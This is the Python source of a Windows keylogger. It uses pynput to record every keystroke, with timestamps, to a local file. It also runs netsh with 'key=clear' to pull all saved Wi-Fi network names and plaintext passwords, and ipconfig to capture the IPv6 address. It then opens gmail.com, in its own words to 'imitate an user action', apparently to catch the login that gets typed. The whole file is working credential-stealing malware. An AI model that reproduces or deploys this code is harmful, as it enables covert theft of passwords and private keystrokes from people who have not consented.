import logging
import os
import time
import subprocess
import re
from threading import Thread
from pynput import keyboard


Keylogs = "logs.txt"
WifiCred= "wifi.txt"

#To Get user timing's and input for the keylogger
logging.basicConfig(filename=Keylogs, level=logging.DEBUG, format='%(asctime)s: %(message)s')

buffer = [] 
shift_pressed = False
caps_on = False

# Shift key mappings for symbols
shift_map = {
    '`': '~', '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
    '6': '^', '7': '&', '8': '*', '9': '(', '0': ')', '-': '_',
    '=': '+', '[': '{', ']': '}', '\\': '|', ';': ':', "'": '"',
    ',': '<', '.': '>', '/': '?'
}

def handle_key(key):
    global shift_pressed, caps_on
    try:
        char = key.char  
        if char is None:
            return None  
        if char.isalpha(): 
            return char.upper() if shift_pressed ^ caps_on else char
        elif shift_pressed and char in shift_map:  # For symbols
            return shift_map[char]
        else:
            return char
    except AttributeError:
        return None  

def on_press(key):
    global shift_pressed, caps_on, buffer
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = True
    elif key == keyboard.Key.caps_lock:
        caps_on = not caps_on
    elif key == keyboard.Key.backspace:
        if buffer:
            buffer.pop() 
    elif key == keyboard.Key.space:
        buffer.append(' ')  
    elif key == keyboard.Key.enter:
        buffer.append('\n')  
    else:
        char = handle_key(key)
        if char:
            buffer.append(char)

def on_release(key):
    global shift_pressed
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = False

def log_keys():
    global buffer
    while True:
        time.sleep(5)  
        if buffer:  
            with open(Keylogs, "a") as file:
                file.write("".join(buffer))  
            buffer.clear() 




def getWifi():
    #running commands via cmd to get wifi details
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
    profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
    wifi_list = []
    ipcmdout = subprocess.run(["ipconfig"], capture_output = True).stdout.decode()
    ipv6add=re.search("IPv6 Address. . . . . . . . . . . :(.*)\r", ipcmdout)
    with open(WifiCred, "a") as file1:
        file1.write("IP Address:"+ipv6add.group(1)+"\n")
    if len(profile_names) != 0:
        for name in profile_names:
            wifi_profile = {}
            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
            if re.search("Security key           : Absent", profile_info):
                continue
            else:
                wifi_profile["ssid"] = name
                profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                password = re.search("Key Content            : (.*)\r", profile_info_pass)
                if password == None:
                    wifi_profile["password"] = None
                else:
                    wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile)
                
     
     

    for x in range(len(wifi_list)):
                with open(WifiCred, "a") as file1:
                    y=str(wifi_list[x])
                    file1.write(y+"\n")



#Main Program
if __name__ == "__main__":
    #Calling the function to get all wifi details of the user
    getWifi()
    #Log Start useful to understand common usage times and behaviours of the user
    logging.info("Keylogger started.")
    os.system("start https://www.gmail.com") #Open A URL to imitate an user action 
    Thread(target=log_keys, daemon=True).start() #Running logging as a thread and as a daemon thread

    # Start the keylogger 
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        try:
            listener.join()  
        except KeyboardInterrupt:
            if buffer:
                with open(Keylogs, "a") as file:
                    file.write("".join(buffer) + "\n")

